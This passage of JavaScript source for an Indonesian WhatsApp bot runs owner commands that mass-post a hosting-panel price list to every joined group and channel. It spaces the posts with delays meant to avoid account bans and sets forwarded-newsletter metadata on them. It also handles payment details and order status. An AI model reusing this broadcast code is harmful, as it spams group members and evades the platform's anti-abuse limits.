× Ram 8GB | Disk: ∞ | CPU: 800% : Rp. 7.000
× Ram 9GB | Disk: ∞ | CPU: 900% : Rp. 8.000
× Ram 10GB | Disk: ∞ | CPU: 1500% : Rp. 9.000
× Ram: ∞ | Disk: ∞ | CPU: ∞ : Rp. 10.000
--------------------------
Keuntungan Bagi yang beli Unli:
* Free Req CPU Threads ( CPU TERPASANG )
* Bonus 2 Panel Unli Free!!!
* Free Req Jumlah Backup & Database!!!
==================================
              •|| [ PRIVATE ] ||•
× Ram 1GB | Disk: ∞ | CPU: ∞ : Rp. 1.000
× Ram 2GB | Disk: ∞ | CPU: ∞ : Rp. 2.000
× Ram 3GB | Disk: ∞ | CPU: ∞ : Rp. 3.000
× Ram 4GB | Disk: ∞ | CPU: ∞ : Rp. 4.000
× Ram 5GB | Disk: ∞ | CPU: ∞ : Rp. 5.000
× Ram 6GB | Disk: ∞ | CPU: ∞ : Rp. 6.000
× Ram 7GB | Disk: ∞ | CPU: ∞ : Rp. 7.000
× Ram 8GB | Disk: ∞ | CPU: ∞ : Rp. 8.000
× Ram 9GB | Disk: ∞ | CPU: ∞ : Rp. 9.000
× Ram 10GB | Disk: ∞ | CPU: ∞ : Rp. 10.000
× Ram ∞ | Disk: ∞ | CPU: ∞ : Rp. 12.000
------------------------------------
Keuntungan Panel Private:
* Anti Colong dan ngintip.
* Anti Delay!!!
* Free Req CPU Threads ( CPU TERPASANG )
* Free Req Jumlah Backup & Database!!!
* Bonus 3 Panel Unli Free!!!

MINAT ?
Order: wa.me/6281578031233
                                
Pembayaran
ALL PAYMENT!!!

Garansi?
1 Bulan, ∞ Replace

===============================

*_© メミＸＹ𝕮𝖔𝖔𝖑𝔠𝔯𝔞𝔣𝔱ミ⁠メ_*`; 

    const jid = m.chat;
    const gambarDefault = "./pm/promosi.jpg";

    await Reply(`Memproses *${command}* Share Ke ${res.length} Group`);

    for (let i of res) {
        if (
            global.db.groups[i] &&
            global.db.groups[i].blacklistjpm &&
            global.db.groups[i].blacklistjpm === true
        ) {
            continue;
        }

        try {
            await conn.sendMessage(
                i,
                {
                    image: fs.readFileSync(gambarDefault),
                    caption: teks,
                    contextInfo: {
                        isForwarded: true,
                        mentionedJid: [m.sender],
                        businessMessageForwardInfo: {
                            businessOwnerJid: `${global.owner}@s.whatsapp.net`,
                        },
                        forwardedNewsletterMessageInfo: {
                            newsletterName: global.namaSaluran,
                            newsletterJid: global.idSaluran,
                        },
                    },
                },
                { quoted: qlocJpm }
            );
            count++;
            suksesGrup.push(allgrup[i].subject); // Menambahkan nama grup ke dalam array suksesGrup
        } catch (err) {
            console.error(`Gagal mengirim ke grup ${i}:`, err);
        }

        await sleep(global.delayJpm);
    }

    // Membuat daftar grup dengan nomor berturutan
    const daftarSukses = suksesGrup
        .map((grup, index) => `${index + 1}. ${grup}`)
        .join("\n");

    // Mengirimkan pesan ke pengguna dengan daftar grup yang berhasil
    await conn.sendMessage(
        jid,
        {
            text: `*${command} Telah Selesai ✅*\nTotal grup yang berhasil dikirim pesan: ${count}\n\n*Grup yang berhasil:*\n${daftarSukses}`,
        },
        { quoted: qlocJpm }
    );
}
break;

case 'promosi-ch': {
    if (!isCreator) return Reply(mess.owner);

    // Memuat daftar saluran dari file JSON
    const fs = require('fs');
    let daftarSaluran;
    try {
        daftarSaluran = JSON.parse(fs.readFileSync('./library/database/idsaluran.json', 'utf8')); // Baca file JSON
    } catch (error) {
        console.error("Gagal membaca file idsaluran.json:", error);
        return Reply("❌ Gagal membaca daftar saluran.");
    }

    // Pesan promosi
    const teksPromosi = `
List Panel Run BOT WA By XYCoolcraft Store ID
==========================
        •|| [ PUBLIC ] ||•
× Ram 1GB | Disk: ∞ | CPU: 100% : Rp. 500
× Ram 2GB | Disk: ∞ | CPU: 200% : Rp. 1.000
× Ram 3GB | Disk: ∞ | CPU: 300% : Rp. 2.000
× Ram 4GB | Disk: ∞ | CPU: 400% : Rp. 3.000
× Ram 5GB | Disk: ∞ | CPU: 500% : Rp. 4.000
× Ram 6GB | Disk: ∞ | CPU: 600% : Rp. 5.000
× Ram 7GB | Disk: ∞ | CPU: 700% : Rp. 6.000
× Ram 8GB | Disk: ∞ | CPU: 800% : Rp. 7.000
× Ram 9GB | Disk: ∞ | CPU: 900% : Rp. 8.000
× Ram 10GB | Disk: ∞ | CPU: 1500% : Rp. 9.000
× Ram: ∞ | Disk: ∞ | CPU: ∞ : Rp. 10.000
--------------------------
Keuntungan Bagi yang beli Unli:
* Free Req CPU Threads ( CPU TERPASANG )
* Bonus 2 Panel Unli Free!!!
* Free Req Jumlah Backup & Database!!!
==================================
              •|| [ PRIVATE ] ||•
× Ram 1GB | Disk: ∞ | CPU: ∞ : Rp. 1.000
× Ram 2GB | Disk: ∞ | CPU: ∞ : Rp. 2.000
× Ram 3GB | Disk: ∞ | CPU: ∞ : Rp. 3.000
× Ram 4GB | Disk: ∞ | CPU: ∞ : Rp. 4.000
× Ram 5GB | Disk: ∞ | CPU: ∞ : Rp. 5.000
× Ram 6GB | Disk: ∞ | CPU: ∞ : Rp. 6.000
× Ram 7GB | Disk: ∞ | CPU: ∞ : Rp. 7.000
× Ram 8GB | Disk: ∞ | CPU: ∞ : Rp. 8.000
× Ram 9GB | Disk: ∞ | CPU: ∞ : Rp. 9.000
× Ram 10GB | Disk: ∞ | CPU: ∞ : Rp. 10.000
× Ram ∞ | Disk: ∞ | CPU: ∞ : Rp. 12.000
------------------------------------
Keuntungan Panel Private:
* Anti Colong dan ngintip.
* Anti Delay!!!
* Free Req CPU Threads ( CPU TERPASANG )
* Free Req Jumlah Backup & Database!!!
* Bonus 3 Panel Unli Free!!!

MINAT ?
Order: wa.me/6281578031233
                                
Pembayaran
ALL PAYMENT!!!

Garansi?
1 Bulan, ∞ Replace

===============================

*_© メミＸＹ𝕮𝖔𝖔𝖑𝔠𝔯𝔞𝔣𝔱ミ⁠メ*`;

    // Gambar promosi default
    const gambarDefault = fs.readFileSync("./pm/promosi.jpg");

    // Beri tahu pengguna bahwa proses sedang berlangsung
    Reply("⏳ Harap sabar, proses sedang berlangsung... (Jeda 5 menit untuk menghindari penonaktifan nomor)");

    // Kirim pesan dan gambar ke semua channel dalam daftar
    for (const idSaluran of daftarSaluran) {
        try {
            await conn.sendMessage(idSaluran, {
                image: gambarDefault,
                caption: teksPromosi
            }); 
        } catch (error) {
            console.error(`Gagal mengirim ke saluran ${idSaluran}:`, error); // Log jika gagal
        }
    }

    // Konfirmasi setelah semua pesan dikirim
    Reply("✅ Berhasil mengirim promosi ke semua channel WhatsApp.");
}
break;

case 'pmadp': {
    if (!isCreator) return Reply(mess.owner);

    const allgrup = await conn.groupFetchAllParticipating();
    const res = Object.keys(allgrup);
    let count = 0;
    let suksesGrup = []; // Array untuk menyimpan grup yang berhasil

    const teks = `List Panel Run BOT WA By XYCoolcraft Store ID
==========================
        •|| [ PUBLIC ] ||•
× Ram 1GB | Disk: ∞ | CPU: 100% : Rp. 500
× Ram 2GB | Disk: ∞ | CPU: 200% : Rp. 1.000
× Ram 3GB | Disk: ∞ | CPU: 300% : Rp. 2.000
× Ram 4GB | Disk: ∞ | CPU: 400% : Rp. 3.000
× Ram 5GB | Disk: ∞ | CPU: 500% : Rp. 4.000
× Ram 6GB | Disk: ∞ | CPU: 600% : Rp. 5.000
× Ram 7GB | Disk: ∞ | CPU: 700% : Rp. 6.000
× Ram 8GB | Disk: ∞ | CPU: 800% : Rp. 7.000
× Ram 9GB | Disk: ∞ | CPU: 900% : Rp. 8.000
× Ram 10GB | Disk: ∞ | CPU: 1500% : Rp. 9.000
× Ram: ∞ | Disk: ∞ | CPU: ∞ : Rp. 10.000
--------------------------
Keuntungan Bagi yang beli Unli:
* Free Req CPU Threads ( CPU TERPASANG )
* Bonus 2 Panel Unli Free!!!
* Free Req Jumlah Backup & Database!!!
==================================
              •|| [ PRIVATE ] ||•
× Ram 1GB | Disk: ∞ | CPU: ∞ : Rp. 1.000
× Ram 2GB | Disk: ∞ | CPU: ∞ : Rp. 2.000
× Ram 3GB | Disk: ∞ | CPU: ∞ : Rp. 3.000
× Ram 4GB | Disk: ∞ | CPU: ∞ : Rp. 4.000
× Ram 5GB | Disk: ∞ | CPU: ∞ : Rp. 5.000
× Ram 6GB | Disk: ∞ | CPU: ∞ : Rp. 6.000
× Ram 7GB | Disk: ∞ | CPU: ∞ : Rp. 7.000
× Ram 8GB | Disk: ∞ | CPU: ∞ : Rp. 8.000
× Ram 9GB | Disk: ∞ | CPU: ∞ : Rp. 9.000
× Ram 10GB | Disk: ∞ | CPU: ∞ : Rp. 10.000
× Ram ∞ | Disk: ∞ | CPU: ∞ : Rp. 12.000
------------------------------------
Keuntungan Panel Private:
* Anti Colong dan ngintip.
* Anti Delay!!!
* Free Req CPU Threads ( CPU TERPASANG )
* Free Req Jumlah Backup & Database!!!
* Bonus 3 Panel Unli Free!!!

MINAT ?
Order: wa.me/6281578031233
                                
Pembayaran
ALL PAYMENT!!!

Garansi?
1 Bulan, ∞ Replace

===============================

*_© メミＸＹ𝕮𝖔𝖔𝖑𝔠𝔯𝔞𝔣𝔱ミ⁠メ*_`; 

    const jid = m.chat;
    const gambarDefault = "./pm/adp.jpg";

    await Reply(`Memproses *${command}* Share Ke ${res.length} Group`);

    for (let i of res) {
        if (
            global.db.groups[i] &&
            global.db.groups[i].blacklistjpm &&
            global.db.groups[i].blacklistjpm === true
        ) {
            continue;
        }

        try {
            await conn.sendMessage(
                i,
                {
                    image: fs.readFileSync(gambarDefault),
                    caption: teks,
                    contextInfo: {
                        isForwarded: true,
                        mentionedJid: [m.sender],
                        businessMessageForwardInfo: {
                            businessOwnerJid: `${global.owner}@s.whatsapp.net`,
                        },
                        forwardedNewsletterMessageInfo: {
                            newsletterName: global.namaSaluran,
                            newsletterJid: global.idSaluran,
                        },
                    },
                },
                { quoted: qlocJpm }
            );
            count++;
            suksesGrup.push(allgrup[i].subject); // Menambahkan nama grup ke dalam array suksesGrup
        } catch (err) {
            console.error(`Gagal mengirim ke grup ${i}:`, err);
        }

        await sleep(global.delayJpm);
    }

    // Membuat daftar grup dengan nomor berturutan
    const daftarSukses = suksesGrup
        .map((grup, index) => `${index + 1}. ${grup}`)
        .join("\n");

    // Mengirimkan pesan ke pengguna dengan daftar grup yang berhasil
    await conn.sendMessage(
        jid,
        {
            text: `*${command} Telah Selesai ✅*\nTotal grup yang berhasil dikirim pesan: ${count}\n\n*Grup yang berhasil:*\n${daftarSukses}`,
        },
        { quoted: qlocJpm }
    );
}
break;

case 'pmadp-ch': {
    if (!isCreator) return Reply(mess.owner);

    // Memuat daftar saluran dari file JSON
    const fs = require('fs');
    let daftarSaluran;
    try {
        daftarSaluran = JSON.parse(fs.readFileSync('./library/database/idsaluran.json', 'utf8')); // Baca file JSON
    } catch (error) {
        console.error("Gagal membaca file idsaluran.json:", error);
        return Reply("❌ Gagal membaca daftar saluran.");
    }

    // Pesan promosi
    const teksPromosi = `List Panel Run BOT WA By XYCoolcraft Store ID
==========================
        •|| [ PUBLIC ] ||•
× Ram 1GB | Disk: ∞ | CPU: 100% : Rp. 500
× Ram 2GB | Disk: ∞ | CPU: 200% : Rp. 1.000
× Ram 3GB | Disk: ∞ | CPU: 300% : Rp. 2.000
× Ram 4GB | Disk: ∞ | CPU: 400% : Rp. 3.000
× Ram 5GB | Disk: ∞ | CPU: 500% : Rp. 4.000
× Ram 6GB | Disk: ∞ | CPU: 600% : Rp. 5.000
× Ram 7GB | Disk: ∞ | CPU: 700% : Rp. 6.000
× Ram 8GB | Disk: ∞ | CPU: 800% : Rp. 7.000
× Ram 9GB | Disk: ∞ | CPU: 900% : Rp. 8.000
× Ram 10GB | Disk: ∞ | CPU: 1500% : Rp. 9.000
× Ram: ∞ | Disk: ∞ | CPU: ∞ : Rp. 10.000
--------------------------
Keuntungan Bagi yang beli Unli:
* Free Req CPU Threads ( CPU TERPASANG )
* Bonus 2 Panel Unli Free!!!
* Free Req Jumlah Backup & Database!!!
==================================
              •|| [ PRIVATE ] ||•
× Ram 1GB | Disk: ∞ | CPU: ∞ : Rp. 1.000
× Ram 2GB | Disk: ∞ | CPU: ∞ : Rp. 2.000
× Ram 3GB | Disk: ∞ | CPU: ∞ : Rp. 3.000
× Ram 4GB | Disk: ∞ | CPU: ∞ : Rp. 4.000
× Ram 5GB | Disk: ∞ | CPU: ∞ : Rp. 5.000
× Ram 6GB | Disk: ∞ | CPU: ∞ : Rp. 6.000
× Ram 7GB | Disk: ∞ | CPU: ∞ : Rp. 7.000
× Ram 8GB | Disk: ∞ | CPU: ∞ : Rp. 8.000
× Ram 9GB | Disk: ∞ | CPU: ∞ : Rp. 9.000
× Ram 10GB | Disk: ∞ | CPU: ∞ : Rp. 10.000
× Ram ∞ | Disk: ∞ | CPU: ∞ : Rp. 12.000
------------------------------------
Keuntungan Panel Private:
* Anti Colong dan ngintip.
* Anti Delay!!!
* Free Req CPU Threads ( CPU TERPASANG )
* Free Req Jumlah Backup & Database!!!
* Bonus 3 Panel Unli Free!!!

MINAT ?
Order: wa.me/6281578031233
                                
Pembayaran
ALL PAYMENT!!!

Garansi?
1 Bulan, ∞ Replace

===============================

*_© メミＸＹ𝕮𝖔𝖔𝖑𝔠𝔯𝔞𝔣𝔱ミ⁠メ*_`;

    // Gambar promosi default
    const gambarDefault = fs.readFileSync("./pm/adp.jpg");

    // Beri tahu pengguna bahwa proses sedang berlangsung
    Reply("⏳ Harap sabar, proses sedang berlangsung...");

    // Kirim pesan dan gambar ke semua channel dalam daftar
    for (const idSaluran of daftarSaluran) {
        try {
            await conn.sendMessage(idSaluran, {
                image: gambarDefault,
                caption: teksPromosi
            }); 
        } catch (error) {
            console.error(`Gagal mengirim ke saluran ${idSaluran}:`, error); // Log jika gagal
        }
    }

    // Konfirmasi setelah semua pesan dikirim
    Reply("✅ Berhasil mengirim promosi ke semua channel WhatsApp.");
}
break;

case 'pmdomain': {
    if (!isCreator) return Reply(mess.owner);

    const allgrup = await conn.groupFetchAllParticipating();
    const res = Object.keys(allgrup);
    let count = 0;
    let suksesGrup = []; // Array untuk menyimpan grup yang berhasil

    const teks = `
\`メミＸＹ𝕮𝖔𝖔𝖑𝔠𝔯𝔞𝔣𝔱ミ⁠メ || XYTeam Shop ID\`

List Panel Run BOT WA By XYCoolcraft Store ID
==========================
        •|| [ PUBLIC ] ||•
× Ram 1GB | Disk: ∞ | CPU: 100% : Rp. 500
× Ram 2GB | Disk: ∞ | CPU: 200% : Rp. 1.000
× Ram 3GB | Disk: ∞ | CPU: 300% : Rp. 2.000
× Ram 4GB | Disk: ∞ | CPU: 400% : Rp. 3.000
× Ram 5GB | Disk: ∞ | CPU: 500% : Rp. 4.000
× Ram 6GB | Disk: ∞ | CPU: 600% : Rp. 5.000
× Ram 7GB | Disk: ∞ | CPU: 700% : Rp. 6.000
× Ram 8GB | Disk: ∞ | CPU: 800% : Rp. 7.000
× Ram 9GB | Disk: ∞ | CPU: 900% : Rp. 8.000
× Ram 10GB | Disk: ∞ | CPU: 1500% : Rp. 9.000
× Ram: ∞ | Disk: ∞ | CPU: ∞ : Rp. 10.000
--------------------------
Keuntungan Bagi yang beli Unli:
* Free Req CPU Threads ( CPU TERPASANG )
* Bonus 2 Panel Unli Free!!!
* Free Req Jumlah Backup & Database!!!
==================================
              •|| [ PRIVATE ] ||•
× Ram 1GB | Disk: ∞ | CPU: ∞ : Rp. 1.000
× Ram 2GB | Disk: ∞ | CPU: ∞ : Rp. 2.000
× Ram 3GB | Disk: ∞ | CPU: ∞ : Rp. 3.000
× Ram 4GB | Disk: ∞ | CPU: ∞ : Rp. 4.000
× Ram 5GB | Disk: ∞ | CPU: ∞ : Rp. 5.000
× Ram 6GB | Disk: ∞ | CPU: ∞ : Rp. 6.000
× Ram 7GB | Disk: ∞ | CPU: ∞ : Rp. 7.000
× Ram 8GB | Disk: ∞ | CPU: ∞ : Rp. 8.000
× Ram 9GB | Disk: ∞ | CPU: ∞ : Rp. 9.000
× Ram 10GB | Disk: ∞ | CPU: ∞ : Rp. 10.000
× Ram ∞ | Disk: ∞ | CPU: ∞ : Rp. 12.000
------------------------------------
Keuntungan Panel Private:
* Anti Colong dan ngintip.
* Anti Delay!!!
* Free Req CPU Threads ( CPU TERPASANG )
* Free Req Jumlah Backup & Database!!!
* Bonus 3 Panel Unli Free!!!

MINAT ?
Order: wa.me/6281578031233
                                
Pembayaran
ALL PAYMENT!!!

Garansi?
1 Bulan, ∞ Replace

===============================

*_© メミＸＹ𝕮𝖔𝖔𝖑𝔠𝔯𝔞𝔣𝔱ミ⁠メ*_
`; 

    const jid = m.chat;

    await Reply(`Memproses *${command}* Share Ke ${res.length} Group`);

    for (let i of res) {
        if (
            global.db.groups[i] &&
            global.db.groups[i].blacklistjpm &&
            global.db.groups[i].blacklistjpm === true
        ) {
            continue;
        }

        try {
            await conn.sendMessage(
                i,
                {
                    text: teks,
                    contextInfo: {
                        isForwarded: true,
                        mentionedJid: [m.sender],
                        businessMessageForwardInfo: {
                            businessOwnerJid: `${global.owner}@s.whatsapp.net`,
                        },
                        forwardedNewsletterMessageInfo: {
                            newsletterName: global.namaSaluran,
                            newsletterJid: global.idSaluran,
                        },
                    },
                },
                { quoted: qlocJpm }
            );
            count++;
            suksesGrup.push(allgrup[i].subject); // Menambahkan nama grup ke dalam array suksesGrup
        } catch (err) {
            console.error(`Gagal mengirim ke grup ${i}:`, err);
        }

        await sleep(global.delayJpm);
    }

    // Membuat daftar grup dengan nomor berturutan
    const daftarSukses = suksesGrup
        .map((grup, index) => `${index + 1}. ${grup}`)
        .join("\n");

    // Mengirimkan pesan ke pengguna dengan daftar grup yang berhasil
    await conn.sendMessage(
        jid,
        {
            text: `*${command} Telah Selesai ✅*\nTotal grup yang berhasil dikirim pesan: ${count}\n\n*Grup yang berhasil:*\n${daftarSukses}`,
        },
        { quoted: qlocJpm }
    );
}
break;

case 'pmdomain-ch': {
    if (!isCreator) return Reply(mess.owner);

    // Memuat daftar saluran dari file JSON
    const fs = require('fs');
    let daftarSaluran;
    try {
        daftarSaluran = JSON.parse(fs.readFileSync('./library/database/idsaluran.json', 'utf8')); // Baca file JSON
    } catch (error) {
        console.error("Gagal membaca file idsaluran.json:", error);
        return Reply("❌ Gagal membaca daftar saluran.");
    }

    // Pesan promosi
    const teksPromosi = `
\`メミＸＹ𝕮𝖔𝖔𝖑𝔠𝔯𝔞𝔣𝔱ミ⁠メ || XYTeam Shop ID\`

List Panel Run BOT WA By XYCoolcraft Store ID
==========================
        •|| [ PUBLIC ] ||•
× Ram 1GB | Disk: ∞ | CPU: 100% : Rp. 500
× Ram 2GB | Disk: ∞ | CPU: 200% : Rp. 1.000
× Ram 3GB | Disk: ∞ | CPU: 300% : Rp. 2.000
× Ram 4GB | Disk: ∞ | CPU: 400% : Rp. 3.000
× Ram 5GB | Disk: ∞ | CPU: 500% : Rp. 4.000
× Ram 6GB | Disk: ∞ | CPU: 600% : Rp. 5.000
× Ram 7GB | Disk: ∞ | CPU: 700% : Rp. 6.000
× Ram 8GB | Disk: ∞ | CPU: 800% : Rp. 7.000
× Ram 9GB | Disk: ∞ | CPU: 900% : Rp. 8.000
× Ram 10GB | Disk: ∞ | CPU: 1500% : Rp. 9.000
× Ram: ∞ | Disk: ∞ | CPU: ∞ : Rp. 10.000
--------------------------
Keuntungan Bagi yang beli Unli:
* Free Req CPU Threads ( CPU TERPASANG )
* Bonus 2 Panel Unli Free!!!
* Free Req Jumlah Backup & Database!!!
==================================
              •|| [ PRIVATE ] ||•
× Ram 1GB | Disk: ∞ | CPU: ∞ : Rp. 1.000
× Ram 2GB | Disk: ∞ | CPU: ∞ : Rp. 2.000
× Ram 3GB | Disk: ∞ | CPU: ∞ : Rp. 3.000
× Ram 4GB | Disk: ∞ | CPU: ∞ : Rp. 4.000
× Ram 5GB | Disk: ∞ | CPU: ∞ : Rp. 5.000
× Ram 6GB | Disk: ∞ | CPU: ∞ : Rp. 6.000
× Ram 7GB | Disk: ∞ | CPU: ∞ : Rp. 7.000
× Ram 8GB | Disk: ∞ | CPU: ∞ : Rp. 8.000
× Ram 9GB | Disk: ∞ | CPU: ∞ : Rp. 9.000
× Ram 10GB | Disk: ∞ | CPU: ∞ : Rp. 10.000
× Ram ∞ | Disk: ∞ | CPU: ∞ : Rp. 12.000
------------------------------------
Keuntungan Panel Private:
* Anti Colong dan ngintip.
* Anti Delay!!!
* Free Req CPU Threads ( CPU TERPASANG )
* Free Req Jumlah Backup & Database!!!
* Bonus 3 Panel Unli Free!!!

MINAT ?
Order: wa.me/6281578031233
                                
Pembayaran
ALL PAYMENT!!!

Garansi?
1 Bulan, ∞ Replace

===============================

*_© メミＸＹ𝕮𝖔𝖔𝖑𝔠𝔯𝔞𝔣𝔱ミ⁠メ*_
`;

    // Beri tahu pengguna bahwa proses sedang berlangsung
    Reply("⏳ Harap sabar, proses sedang berlangsung... (Jeda 5 menit untuk menghindari penonaktifan nomor)");

    // Kirim pesan teks ke semua channel dalam daftar
    for (const idSaluran of daftarSaluran) {
        try {
            await conn.sendMessage(idSaluran, { text: teksPromosi });
        } catch (error) {
            console.error(`Gagal mengirim ke saluran ${idSaluran}:`, error); // Log jika gagal
        }
    }

    // Konfirmasi setelah semua pesan dikirim
    Reply("✅ Berhasil mengirim promosi ke semua channel WhatsApp.");
}
break;

case "pay": case "payment": case "qris": {
await conn.sendMessage(m.chat, {
  footer: `© WhatsApp Bots - 2025`,
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Payment Lain',
          sections: [
            {
              title: 'List Payment',
              rows: [
                {
                  title: 'DANA',
                  id: '.dana'
                },
                {
                  title: 'OVO',
                  id: '.ovo'
                },                
                {
                  title: 'GOPAY',
                  id: '.gopay'
                },
                {
                  title: 'SHOPEEPAY',
                  id: '.shopepay'
                }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: global.image.qris}, 
  caption: "\n```Scan qris diatas dan jika sudah transfer mohon sertakan bukti```\n"
}, {quoted: qtext2})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "dana": {
if (!isCreator) return
let teks = `
*PAYMENT DANA ${global.namaOwner.toUpperCase()}*

* *Nomor :* ${global.dana}

*[ ! ] Penting :* \`\`\`Wajib kirimkan bukti transfer demi keamanan bersama\`\`\`
`
await conn.sendMessage(m.chat, {text: teks}, {quoted: qtext2})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "ovo": {
if (!isCreator) return
let teks = `
*PAYMENT OVO ${global.namaOwner.toUpperCase()}*

* *Nomor :* ${global.ovo}

*[ ! ] Penting :* \`\`\`Wajib kirimkan bukti transfer demi keamanan bersama\`\`\`
`
await conn.sendMessage(m.chat, {text: teks}, {quoted: qtext2})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "gopay": {
if (!isCreator) return
let teks = `
*PAYMENT GOPAY ${global.namaOwner.toUpperCase()}*

* *Nomor :* ${global.gopay}

*[ ! ] Penting :* \`\`\`Wajib kirimkan bukti transfer demi keamanan bersama\`\`\`
`
await conn.sendMessage(m.chat, {text: teks}, {quoted: qtext2})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "shopepay": {
if (!isCreator) return
let teks = `
*PAYMENT SHOPEPAY ${global.namaOwner.toUpperCase()}*

* *Nomor :* ${global.shopepay}

*[ ! ] Penting :* \`\`\`Wajib kirimkan bukti transfer demi keamanan bersama\`\`\`
`
await conn.sendMessage(m.chat, {text: teks}, {quoted: qtext2})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "ambilq": case "q": {
if (!m.quoted) return
let jsonData = JSON.stringify(m.quoted, null, 2)
m.reply(jsonData)
} 
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "toaudio": case "tovn": {
if (!/video|mp4/.test(mime)) return m.reply(example("dengan reply/kirim vidio"))
const vid = await conn.downloadAndSaveMediaMessage(qmsg)
const result = await toAudio(fs.readFileSync(vid), "mp4")
await conn.sendMessage(m.chat, { audio: result, mimetype: "audio/mpeg", ptt: /tovn/.test(command) ? true : false }, { quoted: m })
await fs.unlinkSync(vid)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "proses": { 
if (!isCreator) return Reply(mess.owner);
if (!text) return m.reply(example("panel"));
var kontolodon = `
╭───❲ *PROSES* ❳────╮
 📦 *Barang : ${text}*
 🕐 *Status*: Proses ✅
 🎯 *Catatan*: Terima kasih atas kepercayaannya.
 ━━━━━━━━━━━━━━━━━━━━
  ✨ *_Selamat menggunakan layanan kami!_*
  ━━━━━━━━━━━━━━━━━━━━

_*© 2025 - メミＸＹ𝕮𝖔𝖔𝖑𝔠𝔯𝔞𝔣𝔱ミ⁠メ || XYTeam Shop ID*_
`
await conn.sendMessage(m.chat, {text: kontolodon}, { quoted: qtoko });
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "done": {
    if (!isCreator) return Reply(mess.owner);
    let t = q.split(',');
    
 if (t.length < 2) return m.reply(`*Format salah!*\nPenggunaan: ${prefix + command} barang,harga`);

 let barang = t[0];
 let harga = t[1];
var kontole = `
╭───❲ *DONE* ❳────╮
📦 *Barang: ${barang}*
💵 *Harga: ${harga}*
🕐 *Status: Sukses ✅*
🎯 *Catatan: Trx Done All No Reffund*
━━━━━━━━━━━━━━━━━━━━
✨ *_Selamat menggunakan layanan kami!_*
━━━━━━━━━━━━━━━━━━━━
_*© 2025 - メミＸＹ𝕮𝖔𝖔𝖑𝔠𝔯𝔞𝔣𝔱ミ⁠メ || XYTeam Shop ID*_`
await conn.sendMessage(m.chat, {text:kontole}, { quoted: qtoko });
}
break;


//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "developerbot": case "owner": {
await conn.sendContact(m.chat, [global.owner], m)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "save": case "sv": {
if (!isCreator) return
await conn.sendContact(m.chat, [m.chat.split("@")[0]], m)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "self": {
if (!isCreator) return
conn.public = false
m.reply("ɴᴀʜ sᴇʟғ ɢɪɴɪ ᴋᴀɴ ᴇɴᴀᴋ ɢᴀ ʙᴇʀɪsɪᴋ terus biar pada gak ngelunjak🗿☕")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "getcase": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("menu"))
const getcase = (cases) => {
return "case "+`\"${cases}\"`+fs.readFileSync('./ZarStore.js').toString().split('case \"'+cases+'\"')[1].split("break")[0]+"break"
}
try {
m.reply(`${getcase(q)}`)
} catch (e) {
return m.reply(`Case *${text}* tidak ditemukan`)
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "ping": case "uptime": {
let timestamp = speed();
let latensi = speed() - timestamp;
let tio = await nou.os.oos();
var tot = await nou.drive.info();
let respon = `
*🔴 INFORMATION SERVER*

*• Platform :* ${nou.os.type()}
*• Total Ram :* ${formatp(os.totalmem())}
*• Total Disk :* ${tot.totalGb} GB
*• Total Cpu :* ${os.cpus().length} Core
*• Runtime Vps :* ${runtime(os.uptime())}

*🔵 INFORMATION BOTZ*

*• Respon Speed :* ${latensi.toFixed(4)} detik
*• Runtime Bot :* ${runtime(process.uptime())}
`
await m.reply(respon)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "ip": {
if (!isCreator) return
let t = await fetchJson('https://api64.ipify.org?format=json')
m.reply(`IP Panel : ${t.ip}`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "public": {
if (!isCreator) return
conn.public = true
m.reply("sᴜᴍᴘᴀʜ ᴋʟᴀᴜ ᴜᴅᴀ ᴅɪ ᴘᴜʙʟɪᴄ ᴛᴜ ᴊᴀɴɢᴀɴ ʙᴀᴄᴏᴛ ʟᴀʜ")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "restart": case "rst": {
if (!isCreator) return Reply(mess.owner)
await m.reply("Memproses _restart server_ . . .")
var file = await fs.readdirSync("./session")
var anu = await file.filter(i => i !== "creds.json")
for (let t of anu) {
await fs.unlinkSync(`./session/${t}`)
}
await process.send('reset')
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "upchannel": case "upch": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("teksnya bisa dengan kirim foto"))
let res
if (/image/.test(mime)) res = await conn.downloadAndSaveMediaMessage(qmsg)
let content = res !== undefined ? { image: {url: res}, caption: text } : { text: text }
await conn.sendMessage(idSaluran, content)
m.reply("Berhasil mengirim pesan ke dalam channel whatsapp")
if (res !== undefined) await fs.unlinkSync(res)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "upswtag": {
if (!isOwner) return Reply(mess.owner)
if (!text) return m.reply(example("text & bisa dengan kirim foto"))
if (/image/.test(mime)) global.imgsw = qmsg
const meta = await conn.groupFetchAllParticipating()
let dom = await Object.keys(meta)
global.textupsw = text
let list = []
for (let i of dom) {
await list.push({
title: meta[i].subject, 
id: `.create-storywa ${i}|${meta[i].subject}`, 
description: `${meta[i].participants.length} Member`
})
}
return conn.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
